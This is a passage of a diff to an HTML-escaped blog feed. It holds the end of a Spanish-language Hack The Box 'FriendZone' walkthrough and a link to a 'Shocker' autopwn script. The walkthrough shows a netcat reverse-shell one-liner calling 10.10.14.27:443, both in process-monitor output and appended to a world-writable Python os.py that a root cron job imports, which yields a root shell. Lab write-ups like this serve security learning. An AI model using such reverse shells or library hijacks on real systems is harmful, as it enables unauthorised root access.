-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2      | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;197    | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;196    | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;19     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;18     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;175    | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;174    | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;173    | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;171    | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;170    | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;17     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;169    | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;16     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;15     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;14     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;13     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1201   | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;12     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;115    | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11197  | bash 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11187  | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sd-pam&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11186  | /lib/systemd/systemd &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11185  | su friend 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11180  | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11164  | bash 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11163  | sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11162  | script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11158  | nc 10.10.14.27 443 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11157  | /bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11156  | &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11153  | sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.14.27 443 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/
-f 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11152  | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11151  | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11150  | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11149  | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11148  | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11147  | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11140  | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10716  | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33   &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10715  | script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10     | 
-2021/12/07 06:52:05 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1      | /sbin/init splash
-2021/12/07 06:54:01 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;44095  | /usr/bin/python /opt/server_admin/reporter.py 
-2021/12/07 06:54:01 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;44094  | /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /opt/server_admin/reporter.py 
-2021/12/07 06:54:01 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;44093  | /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 
-2021/12/07 06:56:01 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;44098  | /usr/bin/python /opt/server_admin/reporter.py 
-2021/12/07 06:56:01 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;44097  | /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /opt/server_admin/reporter.py 
-2021/12/07 06:56:01 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;44096  | /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Se observa que se ejecuta el programa en python &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/server_admin/reporter.py&lt;/code&gt; y quien lo ejecuta es el usuario &lt;strong&gt;root&lt;/strong&gt; (UID=0).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 4
-drwxr-xr-x 2 root root 4096 Jan 24  2019 server_admin
-friend@FriendZone:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;server_admin
-friend@FriendZone:/opt/server_admin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-total 4
-&lt;span class=&quot;nt&quot;&gt;-rwxr--r--&lt;/span&gt; 1 root root 424 Jan 16  2019 reporter.py
-friend@FriendZone:/opt/server_admin&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos permisos de lectura dentro del directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server_admin&lt;/code&gt; y sobre el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reporter.py&lt;/code&gt;; por lo que vamos a echarle un ojo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/opt/server_admin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;reporter.py 
-&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
-
-import os
-
-to_address &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin1@friendzone.com&quot;&lt;/span&gt;
-from_address &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin2@friendzone.com&quot;&lt;/span&gt;
-
-print &lt;span class=&quot;s2&quot;&gt;&quot;[+] Trying to send email to %s&quot;&lt;/span&gt;%to_address
-
-&lt;span class=&quot;c&quot;&gt;#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;'''&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;#os.system(command)&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;# I need to edit the script later&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Sam ~ python developer&lt;/span&gt;
-friend@FriendZone:/opt/server_admin&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Del programa no vemos nada interesante, salvo que se importa la librería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os&lt;/code&gt;, pero no tenemos permisos de escritura del programa ni bajo el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server_admin&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/opt/server_admin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python
-Python 2.7.15rc1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default, Apr 15 2018, 21:51:34&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;GCC 7.3.0] on linux2
-Type &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;copyright&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;credits&quot;&lt;/span&gt; or &lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; import sys
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; sys.path
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/lib/python2.7'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/lib/python2.7/plat-x86_64-linux-gnu'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/lib/python2.7/lib-tk'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/lib/python2.7/lib-old'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/lib/python2.7/lib-dynload'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/local/lib/python2.7/dist-packages'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'/usr/lib/python2.7/dist-packages'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-friend@FriendZone:/opt/server_admin&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Por lo que no podemos hacer &lt;strong&gt;&lt;em&gt;Library Hijacking&lt;/em&gt;&lt;/strong&gt; creando un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.py&lt;/code&gt; dentro del directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server_admin&lt;/code&gt;. Vemos que por default se utiliza python 2.7, así que vamos a echarle un ojo a la librería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.py&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:/opt/server_admin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;locate os.py
-/usr/lib/python2.7/os.py
-/usr/lib/python2.7/os.pyc
-/usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
-/usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
-/usr/lib/python2.7/encodings/palmos.py
-/usr/lib/python2.7/encodings/palmos.pyc
-/usr/lib/python3/dist-packages/LanguageSelector/macros.py
-/usr/lib/python3.6/os.py
-/usr/lib/python3.6/encodings/palmos.py
-friend@FriendZone:/opt/server_admin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /usr/lib/python2.7/os.py
-&lt;span class=&quot;nt&quot;&gt;-rwxrwxrwx&lt;/span&gt; 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py
-friend@FriendZone:/opt/server_admin&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos permisos de escritura del recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/lib/python2.7/os.py&lt;/code&gt;, asi que podemos ejecutar comandos como el usuario &lt;strong&gt;root&lt;/strong&gt;; para este caso, vamos a entablarnos una reverse shell. Al final del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.py&lt;/code&gt; agregamos la siguiente linea:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.27 443 &amp;gt;/tmp/f&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos ponemos en escucha por el puerto 443 y esperamos a que el usuario &lt;strong&gt;root&lt;/strong&gt; ejecute el programa:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.123] 42142
-/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
-# whoami
-root
-# 
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="LFI" /><category term="DNS_Zone_Transfer" /><category term="File_Misconfiguration" /><category term="Web" /><summary type="html">Resolución de la máquina FriendZone en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Se comparte un script autopwn de la máquina &lt;a href=&quot;https://github.com/k4miyo/Shocker-Autopwn&quot;&gt;Shocker Autopwn&lt;/a&gt;.&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Perl" /><category term="Injection" /><category term="Web" /><summary type="html">Resolución de la máquina Shocker en la plataforma de Hack The Box</summary></entry></feed>
